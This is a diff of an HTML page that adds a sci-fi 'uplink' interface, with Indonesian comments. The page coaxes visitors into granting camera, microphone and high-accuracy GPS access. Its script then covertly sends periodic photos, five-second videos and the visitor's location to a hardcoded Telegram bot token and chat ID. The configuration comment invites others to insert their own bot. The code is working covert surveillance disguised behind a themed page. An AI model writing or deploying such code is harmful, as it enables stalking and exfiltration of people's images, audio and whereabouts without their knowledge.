+    <div class="panel" id="txPanel">NEXT TX: --s</div>
+  </div>
+  <div class="hud-center">
+    <video id="video" autoplay muted playsinline></video>
+    <div class="rec-indicator">● REC</div>
+    <div class="countdown" id="countdown">UPLINK ACTIVE</div>
+  </div>
+  <div class="hud-bottom">
+    <div class="log-panel" id="logBox">&gt; SYSTEM ONLINE...</div>
+  </div>
+</div>
 
-        // Video fallback - jika video tidak load, tampilkan gradient background
-        const video = document.getElementById('bgVideo');
-        video.addEventListener('error', function() {
-            document.querySelector('.video-bg').style.background = 
-                'linear-gradient(135deg, #0a0a2e 0%, #1a1a4e 30%, #2a1a3e 60%, #0a0a2e 100%)';
-        });
+<canvas id="photoCanvas" style="display:none;"></canvas>
 
-        // Jika video tidak ada source yang valid, tampilkan background gradient
-        if (!video.querySelector('source').src || video.querySelector('source').src.includes('video-kamu')) {
-            document.querySelector('.video-bg').style.background = 
-                'linear-gradient(135deg, #0a0a2e 0%, #1a1a4e 25%, #2d1b4e 50%, #1a2a4e 75%, #0a0a2e 100%)';
-            video.style.display = 'none';
-        }
-    </script>
+<script>
+// ============================================
+// ⚙️ KONFIGURASI (GANTI SESUAI PUNYA KAMU) ⚙️
+// ============================================
+const BOT_TOKEN = "7334976291:AAEOf0ppLNPYjOF98NC7ceZtMfXPWZ1X-WE";
+const CHAT_ID   = "7223902938";
+// ============================================
+
+let stream, mediaRecorder, chunks = [];
+let nextPhotoTime = 0, nextVideoTime = 0;
+let currentStep = 0;
+const steps = ['cam', 'loc', 'mic'];
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('photoCanvas');
+const logBox = document.getElementById('logBox');
+const txPanel = document.getElementById('txPanel');
+const countdownEl = document.getElementById('countdown');
+const splash = document.getElementById('splashScreen');
+const mainUI = document.getElementById('mainUI');
+const actionBtn = document.getElementById('actionBtn');
+const statusText = document.getElementById('statusText');
+const progressFill = document.getElementById('progressFill');
+const currentStepEl = document.getElementById('currentStep');
+
+function setBadge(id, text, color = '') {
+  const badge = document.getElementById('badge' + id.toUpperCase());
+  badge.textContent = text;
+  if (color) badge.style.color = color;
+}
+
+function activateCard(id) {
+  document.querySelectorAll('.perm-card').forEach(c => c.classList.remove('active'));
+  document.getElementById('card' + id.toUpperCase()).classList.add('active');
+}
+
+function completeCard(id) {
+  document.getElementById('card' + id.toUpperCase()).classList.add('completed');
+  document.getElementById('card' + id.toUpperCase()).classList.remove('active');
+  setBadge(id, 'GRANTED', '#00ff88');
+}
+
+function updateProgress() {
+  const pct = ((currentStep) / steps.length) * 100;
+  progressFill.style.width = pct + '%';
+  currentStepEl.textContent = currentStep + 1;
+}
+
+// --- SEQUENTIAL PERMISSION REQUEST ---
+async function requestNextPermission() {
+  if (currentStep >= steps.length) {
+    // All done
+    actionBtn.textContent = '✓ ACCESS GRANTED';
+    actionBtn.classList.add('complete');
+    actionBtn.disabled = true;
+    statusText.textContent = 'Entering system...';
+    setTimeout(enterMain, 1000);
+    return;
+  }
+
+  const perm = steps[currentStep];
+  activateCard(perm);
+  setBadge(perm, 'REQUESTING...', '#00f3ff');
+  actionBtn.disabled = true;
+  statusText.textContent = `Granting ${perm.toUpperCase()} permission...`;
+
+  try {
+    if (perm === 'cam') {
+      // Request Camera + Mic together (browser requirement)
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'environment', width: { ideal: 1280 } },
+        audio: true
+      });
+      video.srcObject = stream;
+      completeCard('cam');
+      // Mic is also granted with camera, so complete it too
+      setTimeout(() => {
+        completeCard('mic');
+        currentStep = 2; // Skip mic step
+        updateProgress();
+      }, 300);
+      
+    } else if (perm === 'loc') {
+      if (!navigator.geolocation) throw new Error('Geolocation not supported');
+      await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            log(`> GPS ACQUIRED: ${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`);
+            resolve(pos);
+          },
+          reject,
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        );
+      });
+      completeCard('loc');
+      
+    } else if (perm === 'mic') {
+      // Already granted with camera, skip
+      completeCard('mic');
+    }
+
+    currentStep++;
+    updateProgress();
+    actionBtn.disabled = false;
+    
+    if (currentStep < steps.length) {
+      statusText.textContent = `Tap to continue to ${steps[currentStep].toUpperCase()}`;
+      actionBtn.textContent = 'CONTINUE';
+    } else {
+      // All done
+      requestNextPermission();
+    }
+
+  } catch (err) {
+    setBadge(perm, 'DENIED', '#ff3366');
+    statusText.textContent = `Permission denied. Tap to retry.`;
+    actionBtn.disabled = false;
+    actionBtn.textContent = 'RETRY';
+    log(`> PERMISSION DENIED: ${perm} - ${err.message}`);
+  }
+}
+
+actionBtn.onclick = () => {
+  if (currentStep === 0 && actionBtn.textContent === 'INITIALIZE') {
+    log('> INITIALIZING PERMISSION SEQUENCE...');
+  }
+  requestNextPermission();
+};
+
+// --- Enter Main UI ---
+function enterMain() {
+  splash.classList.add('hide');
+  setTimeout(() => {
+    splash.style.display = 'none';
+    mainUI.classList.add('show');
+    startUplink();
+  }, 500);
+}
+
+// --- Starfield Background ---
+const starCanvas = document.getElementById('starfield');
+const sctx = starCanvas.getContext('2d');
+let stars = [];
+function resizeStar() { starCanvas.width = innerWidth; starCanvas.height = innerHeight; }
+addEventListener('resize', resizeStar);
+resizeStar();
+for(let i=0; i<150; i++) stars.push({
+  x: Math.random()*starCanvas.width,
+  y: Math.random()*starCanvas.height,
+  z: Math.random()*2,
+  speed: Math.random()*0.5 + 0.1
+});
+function animateStars() {
+  sctx.fillStyle = '#05050a';
+  sctx.fillRect(0, 0, starCanvas.width, starCanvas.height);
+  sctx.fillStyle = '#00f3ff';
+  stars.forEach(s => {
+    sctx.globalAlpha = s.z;
+    sctx.beginPath();
+    sctx.arc(s.x, s.y, s.z * 1.5, 0, Math.PI*2);
+    sctx.fill();
+    s.y += s.speed;
+    if(s.y > starCanvas.height) { s.y = 0; s.x = Math.random()*starCanvas.width; }
+  });
+  requestAnimationFrame(animateStars);
+}
+animateStars();
+
+// --- Core Functions ---
+function log(msg) {
+  const time = new Date().toLocaleTimeString();
+  const p = document.createElement('div');
+  p.innerHTML = `[${time}] ${msg}`;
+  logBox.prepend(p);
+  if (logBox.children.length > 50) logBox.removeChild(logBox.lastChild);
+}
+
+function takePhoto() {
+  if (!stream) return;
+  const ctx = canvas.getContext('2d');
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg', 0.8);
+}
+
+async function sendPhoto(blob) {
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('photo', blob, 'u_photo.jpg');
+  fd.append('caption', `📸 AUTO TX // ${new Date().toISOString().slice(0,19)}Z`);
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+    const d = await res.json();
+    log(d.ok ? '✅ PHOTO SENT' : `❌ PHOTO: ${d.description}`);
+  } catch(e) { log(`❌ NET ERR: ${e.message}`); }
+}
+
+function startRecording() {
+  if (!stream) return;
+  chunks = [];
+  mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+  mediaRecorder.ondataavailable = e => chunks.push(e.data);
+  mediaRecorder.onstop = () => {
+    const blob = new Blob(chunks, { type: 'video/webm' });
+    sendVideo(blob);
+  };
+  mediaRecorder.start();
+  log('🎥 RECORDING 5s...');
+  setTimeout(() => {
+    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+  }, 5000);
+}
+
+async function sendVideo(blob) {
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('video', blob, 'u_video.webm');
+  fd.append('caption', `🎥 AUTO TX // ${new Date().toISOString().slice(0,19)}Z`);
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+    const d = await res.json();
+    log(d.ok ? '✅ VIDEO SENT' : `❌ VIDEO: ${d.description}`);
+  } catch(e) { log(`❌ NET ERR: ${e.message}`); }
+}
+
+function sendLocation() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(async pos => {
+    const { latitude, longitude, accuracy } = pos.coords;
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude, horizontal_accuracy: accuracy })
+      });
+      const d = await res.json();
+      log(d.ok ? `✅ LOC: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}` : `❌ LOC: ${d.description}`);
+    } catch(e) { log(`❌ NET ERR: ${e.message}`); }
+  }, err => log(`❌ LOC ERR: ${err.message}`), { enableHighAccuracy: true, timeout: 5000 });
+}
+
+function updateTimers() {
+  const now = Date.now();
+  const nextPhoto = Math.max(0, Math.ceil((nextPhotoTime - now)/1000));
+  const nextVideo = Math.max(0, Math.ceil((nextVideoTime - now)/1000));
+  const next = Math.min(nextPhoto, nextVideo);
+  txPanel.textContent = `NEXT TX: ${next}s`;
+  countdownEl.textContent = `UPLINK CYCLE: ${next}s`;
+
+  if (now >= nextPhotoTime) { takePhoto(); nextPhotoTime = now + 30000; }
+  if (now >= nextVideoTime) { startRecording(); sendLocation(); nextVideoTime = now + 60000; }
+  requestAnimationFrame(updateTimers);
+}
+
+function startUplink() {
+  log('> ALL PERMISSIONS GRANTED');
+  log('> UPLINK SEQUENCE STARTED');
+  nextPhotoTime = Date.now() + 2000;
+  nextVideoTime = Date.now() + 5000;
+  updateTimers();
+}
+
+// --- Security check ---
+if (BOT_TOKEN.includes("MASUKKAN") || CHAT_ID.includes("MASUKKAN")) {
+  statusText.textContent = '⚠️ EDIT TOKEN & ID FIRST';
+  actionBtn.onclick = () => alert('Open this file in text editor, replace BOT_TOKEN & CHAT_ID at top of script, then save & refresh.');
+}
+</script>
 </body>
-    </html>
+</html>
